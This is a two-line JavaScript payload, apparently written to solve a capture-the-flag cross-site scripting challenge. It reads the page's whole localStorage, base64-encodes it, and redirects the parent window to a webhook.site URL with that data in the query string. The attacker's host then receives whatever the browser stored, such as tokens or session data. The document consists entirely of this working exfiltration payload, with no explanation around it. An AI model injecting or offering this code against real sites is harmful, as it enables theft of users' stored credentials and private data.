const flag = JSON.stringify({ ...localStorage })

window.parent.document.location = `https://webhook.site/25a9a1e9-e5dc-49d2-8c32-85847db2ddb9?flag=${encodeURIComponent(btoa(flag))}`